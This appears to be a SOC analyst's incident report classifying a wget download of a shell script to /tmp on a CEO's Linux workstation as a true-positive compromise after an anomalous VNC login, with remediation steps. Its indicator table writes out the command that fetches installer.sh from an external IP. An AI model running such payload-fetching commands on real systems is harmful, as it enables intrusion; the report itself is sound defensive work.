# Alert 1007: Download File To Potentially Suspicious Directory Via Wget

## Incident Classification

**True Positive**

## Escalation Required?

**Yes**

## Case Report

### Time of Activity

`09/08/2026 19:59:35.445`

### Affected Entities

| Entity        | Details                        |
| :------------ | :----------------------------- |
| **User**      | `michael.ascot` (CEO)          |
| **Host**      | `Lin-001` (IP: `192.168.0.10`) |
| **Directory** | `/tmp`                         |

### Reason for Classifying as True Positive

This critical alert triggered because the `wget` utility was used to download a shell script (`installer.sh`) directly from an external IP address (`159.65.241.15`) into the potentially suspicious `/tmp` directory. This activity occurred on host `Lin-001`, which belongs to CEO Michael Ascot. Crucially, the SOC handover notes from the previous shift documented an anomalous VNC login detected for Michael on this exact system (`Lin-001`). The sequence of an anomalous remote login followed by downloading an executable payload to a temporary folder strongly indicates a successful system compromise and active malicious post-exploitation activity.

### Reason for Escalating the Alert

Yes, escalation is required. A threat actor appears to have gained unauthorized access to the CEO's workstation and is actively downloading secondary payloads. Immediate incident response actions, including host isolation and remediation, are necessary to contain the threat and prevent lateral movement.

### Recommended Remediation Actions

* Immediately isolate host `Lin-001` from the corporate network to halt the attack chain and prevent lateral movement.
* Disable VNC access to `Lin-001` and force a credential rotation for Michael Ascot's accounts.
* Retrieve and analyze the `installer.sh` payload from the `/tmp` directory to understand its capabilities and identify further indicators of compromise.

## Attack Indicators

| Indicator            | Value                                     |
| :------------------- | :---------------------------------------- |
| **URL**              | `https://159.65.241.15/installer.sh`      |
| **Command Line**     | `wget https://159.65.241.15/installer.sh` |
| **Image**            | `/usr/bin/wget`                           |
| **Target Directory** | `/tmp`                                    |

## Analyst Verdict

**Classification:** True Positive
**Escalation:** Yes

This critical alert indicates a likely successful compromise of CEO Michael Ascot's workstation, `Lin-001`. Following the anomalous VNC login documented in the previous shift's SOC handover notes, `wget` was used to download the `installer.sh` payload from external IP `159.65.241.15` into the `/tmp` directory. The sequence strongly indicates active malicious post-exploitation activity and requires immediate containment and incident response.
